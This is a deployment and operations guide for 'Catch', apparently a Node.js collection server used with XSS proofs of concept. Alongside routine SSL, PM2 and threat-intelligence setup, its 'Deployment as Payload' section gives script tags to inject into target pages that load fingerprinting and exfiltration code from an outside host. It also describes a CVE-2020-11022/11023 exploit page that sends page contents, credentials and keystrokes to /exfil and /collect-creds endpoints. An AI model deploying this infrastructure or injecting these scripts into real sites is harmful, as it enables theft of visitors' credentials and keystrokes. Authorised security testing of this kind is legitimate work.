# Catch - Deployment Guide

> Consolidated deployment, configuration, and operations reference.

---

## Prerequisites

- **Node.js** >= 14.x
- **SSL certificates** (Let's Encrypt recommended)
- **Domain** with DNS pointing to your server
- **Ports** 80 and 443 (or custom) open on firewall

---

## 1. Install

```bash
git clone <repo-url> /home/cmndcntrl/code/catch
cd /home/cmndcntrl/code/catch
npm install
```

Dependencies: `axios`, `dotenv`, `geoip-lite`, `node-cache`

---

## 2. Configure Environment

Copy and edit the environment file:

```bash
cp .env .env.backup   # if modifying existing
```

### Required Settings

| Variable | Description | Example |
|----------|-------------|---------|
| `NODE_ENV` | `production` or `development` | `production` |
| `PORT` / `HTTPS_PORT` | HTTPS listening port | `8443` |
| `HTTP_PORT` | HTTP redirect port | `80` |
| `BASE_URL` | Public URL | `https://catch.attck-deploy.net` |
| `SSL_KEY_PATH` | Private key path | `./ssl/privkey.pem` |
| `SSL_CERT_PATH` | Certificate chain path | `./ssl/fullchain.pem` |
| `USE_HTTPS` | Enable HTTPS | `true` |
| `ADMIN_TOKEN` | Admin panel auth token | *(change default)* |

### Threat Intelligence API Keys

| Variable | Source | Required |
|----------|--------|----------|
| `ABUSEIPDB_API_KEY` | [abuseipdb.com](https://www.abuseipdb.com/) | Optional |
| `OTX_API_KEY` | [otx.alienvault.com](https://otx.alienvault.com/) | Optional |
| `VIRUSTOTAL_API_KEY` | [virustotal.com](https://www.virustotal.com/) | Optional |

Set `ENABLE_THREAT_FEEDS=true` and `ENABLE_IOC_CORRELATION=true` to activate.

### Blocking Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `ENABLE_BLOCKING` | `false` | Enable request blocking |
| `BLOCKING_MODE` | `log` | `log` (detect only) or `block` (active blocking) |
| `BLOCKED_USER_AGENTS` | scanner patterns | Comma-separated regex patterns |
| `BLOCKED_URL_PATTERNS` | common attacks | Comma-separated regex patterns |
| `BLOCKED_BODY_PATTERNS` | webshell patterns | Comma-separated regex patterns |
| `AUTO_BLOCK_AFTER_VIOLATIONS` | `5` | Auto-block threshold |
| `AUTO_BLOCK_DURATION` | `3600000` | Block duration (ms) |
| `THREAT_SCORE_THRESHOLD` | `75` | Threat intel block threshold |
| `AUTO_BLACKLIST_THRESHOLD` | `85` | Auto-blacklist score |

See `.env` for the full reference of all available variables.

---

## 3. SSL Certificates

### Option A: Let's Encrypt (Recommended)

```bash
sudo certbot certonly --standalone -d catch.attck-deploy.net
```

Certificates land in `/etc/letsencrypt/live/catch.attck-deploy.net/`.

Copy to project:
```bash
sudo cp /etc/letsencrypt/live/catch.attck-deploy.net/privkey.pem ./ssl/
sudo cp /etc/letsencrypt/live/catch.attck-deploy.net/fullchain.pem ./ssl/
sudo chown cmndcntrl:cmndcntrl ./ssl/*.pem
chmod 600 ./ssl/privkey.pem
chmod 644 ./ssl/fullchain.pem
```

### Option B: Self-Signed (Development)

```bash
mkdir -p ssl
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout ssl/privkey.pem -out ssl/fullchain.pem \
  -subj "/CN=localhost"
```

### Automated SSL Renewal

Install the renewal cron job:

```bash
sudo ./scripts/install-ssl-automation.sh
```

This sets up:
- Daily check at 3:00 AM via cron
- Auto-copy from Let's Encrypt directory
- Certificate backup with timestamps (keeps last 5)
- Server restart on renewal
- Logging to `logs/ssl-renewal.log`

Verify:
```bash
crontab -l | grep renew-ssl-certs
openssl x509 -in ssl/fullchain.pem -noout -enddate
```

---

## 4. Start the Server

### Development

```bash
npm run dev
# HTTP on port 8081, no SSL required
```

### Production

```bash
npm start
# HTTPS on configured port + HTTP redirect on port 80
```

### Production with PM2 (Recommended)

```bash
npm install -g pm2

pm2 start server.js --name catch \
  --max-memory-restart 512M \
  -i 1

pm2 save
pm2 startup   # enable start on boot
```

PM2 commands:
```bash
pm2 status          # check status
pm2 logs catch      # view logs
pm2 restart catch   # restart
pm2 stop catch      # stop
```

---

## 5. Verify Deployment

```bash
# Development (HTTP, port 8081)
curl http://localhost:8081/health
curl http://localhost:8081/api/fingerprint

# Production (HTTPS, port 443 or 8443)
curl -k https://localhost:8443/health
curl -k https://localhost:8443/api/fingerprint

# Admin panel (browser)
# https://catch.attck-deploy.net/admin?token=<ADMIN_TOKEN>
```

---

## 6. API Endpoints Reference

### Public

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Fingerprinting landing page |
| GET | `/api/fingerprint` | Server-side fingerprint data |
| GET | `/exfil` | Image beacon exfiltration (`?data=<b64>` → logs as `EXFIL-BEACON`) |
| GET | `/exfil-frame` | Iframe exfiltration (`?data=<b64>` → logs as `EXFIL-IFRAME`) |
| GET | `/health` | Health check |
| POST/PUT/PATCH/DELETE | `/*` | Catch-all — all methods and bodies logged (used by PoC for `/exfil-dom`, `/collect-creds`) |

### Admin (requires `?token=<ADMIN_TOKEN>`)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/admin` | Admin interface |
| GET | `/api/admin/config` | Current configuration |
| GET | `/api/admin/logs` | Filtered log viewer |
| GET | `/api/admin/unique-ips` | Unique IPs with DNS lookups |
| GET | `/api/admin/stats` | Statistics dashboard |
| GET | `/api/admin/threat-intel/:ip` | IOC correlation for IP |
| POST | `/api/admin/config` | Update configuration |
| POST | `/api/admin/blacklist/add` | Add IP to blacklist |
| POST | `/api/admin/blacklist/remove` | Remove from blacklist |
| POST | `/api/admin/whitelist/add` | Add IP to whitelist |
| POST | `/api/admin/whitelist/remove` | Remove from whitelist |

---

## 7. Deployment as Payload

### Fingerprint Collector

Embed on a target page to collect browser + server-side data:

```html
<script src="https://catch.attck-deploy.net/js/fingerprint.js"></script>
```

Or for the full exfiltration suite (beacon + fetch + XHR + iframe):

```html
<script src="https://catch.attck-deploy.net/js/test.js"></script>
```

Data collection methods (all configurable via `.env`):
- **Image beacon** — 1x1 pixel GIF, works through CSP restrictions
- **Fetch API** — async POST with `no-cors` mode
- **XMLHttpRequest** — classic XHR fallback
- **Hidden iframe** — iframe injection fallback

### XSS PoC (Download.js / CVE-2020-11022/11023)

`public/download_js_exploit_poc.html` demonstrates P1/P2 impact chaining via jQuery filename injection.

**Before use**, set `CATCH_SERVER` at the top of the file:

```javascript
var CATCH_SERVER = 'https://catch.attck-deploy.net'; // no trailing slash
```

The PoC fires these exfil channels on the target:

| Channel | Catch Endpoint | Log Prefix |
|---------|---------------|------------|
| Image beacon | `GET /exfil?data=<b64>` | `EXFIL-BEACON` |
| Iframe fallback | `GET /exfil-frame?data=<b64>` | `EXFIL-IFRAME` |
| POST (full DOM) | `POST /exfil-dom` | *(body logged)* |
| Credential harvest | `POST /collect-creds` | *(body logged)* |
| Keystrokes | `GET /exfil?data=<b64>` | `EXFIL-BEACON` |

Decode a captured beacon from `logs/access.log`:

```bash
echo "<base64_value>" | base64 -d | python3 -m json.tool
```

---

## 8. Log Files

All logs are stored in the `logs/` directory:

| File | Contents |
|------|----------|
| `logs/access.log` | All request logs |
| `logs/blocked-requests.log` | Blocked request details |
| `logs/ssl-renewal.log` | SSL renewal activity |

View logs:
```bash
npm run logs                       # tail access.log
tail -f logs/blocked-requests.log
```

---

## 9. Threat Intelligence Operations

### Admin UI Workflow

1. Open admin panel and navigate to **Unique IPs** tab
2. Click **Threat Intel** on any IP tile to run IOC correlation
3. Review combined scores from AbuseIPDB, OTX, and VirusTotal
4. Use **Blacklist** / **Whitelist** buttons for immediate action

### Score Interpretation

| Score | Recommendation | Action |
|-------|---------------|--------|
| 0-49 | SAFE | No action needed |
| 50-84 | MONITOR | Watch for patterns |
| 85-100 | BLACKLIST | Auto-blacklisted if enabled |

### API Rate Limits

| Service | Free Tier Limit |
|---------|----------------|
| AbuseIPDB | 1,000 checks/day |
| AlienVault OTX | 10,000 requests/hour |
| VirusTotal | 4 requests/minute |

Results are cached for 1 hour (configurable via `THREAT_INTEL_CACHE_TTL`).

---

## 10. Security Hardening Checklist

- [ ] Change `ADMIN_TOKEN` from default
- [ ] Set `FORCE_HTTPS=true`
- [ ] Set `BIND_ADDRESS=127.0.0.1` if behind a reverse proxy
- [ ] Enable `ENABLE_RATE_LIMITING=true` for production
- [ ] Configure `BLOCKED_IPS` with known bad actors
- [ ] Set `ENABLE_WHITELIST=true` and add trusted IPs
- [ ] Enable `ENABLE_GEOIP_BLOCKING=true` if geo-restriction needed
- [ ] Set file permissions: `chmod 600 .env ssl/privkey.pem`
- [ ] Verify SSL certificate validity regularly
- [ ] Review logs in `logs/` periodically

---

## 11. Troubleshooting

| Issue | Fix |
|-------|-----|
| `EACCES` on port 80/443 | Run with `sudo` or use `setcap`: `sudo setcap 'cap_net_bind_service=+ep' $(which node)` |
| SSL handshake errors | Verify cert paths in `.env`, check file permissions |
| Cron renewal not running | `crontab -l \| grep renew`, check `logs/ssl-renewal.log` |
| Admin panel 403 | Verify `ADMIN_TOKEN` matches query param |
| Threat intel returning empty | Check API keys in `.env`, verify `ENABLE_THREAT_FEEDS=true` |
| High memory usage | Reduce `PM2_MAX_MEMORY`, check `logs/access.log` size |
| Cloudflare 524 timeout | Server has built-in Cloudflare timeout handling; check server health |

---

## File Structure

```
catch/
├── server.js                      # Main application (Node.js HTTP/HTTPS server)
├── config.js                      # Configuration manager (loads .env)
├── .env                           # Environment configuration
├── public/
│   ├── index.html                 # Fingerprinting landing page
│   ├── admin.html                 # Admin interface
│   ├── download_js_exploit_poc.html  # XSS PoC — CVE-2020-11022/11023
│   └── js/
│       ├── fingerprint.js         # Browser fingerprinting engine
│       ├── test.js                # Data exfiltration methods (beacon/fetch/XHR/iframe)
│       ├── admin.js               # Admin interface logic
│       └── admin.css              # Admin styles
├── lib/
│   └── threat-intel.js            # AbuseIPDB / OTX / VirusTotal integration
├── scripts/
│   ├── install-ssl-automation.sh  # Installs SSL renewal cron job
│   ├── renew-ssl-certs.sh         # Renewal script (copies certs, restarts server)
│   ├── cron-ssl-renewal.txt       # Crontab entry (daily 3 AM check)
│   └── sudoers-ssl-renewal        # sudoers fragment for certbot access
├── docs/
│   ├── IMPLEMENTATION-SUMMARY.md  # Feature implementation overview
│   ├── SECURITY.md                # Security policy and responsible use
│   ├── SSL-AUTOMATION-README.md   # SSL automation details
│   ├── THREAT-INTEL-GUIDE.md      # Threat intelligence integration guide
│   └── implementation-guide.md    # Developer setup guide
├── logs/                          # Log files (gitignored)
├── ssl/                           # SSL certificates (gitignored)
└── package.json
```
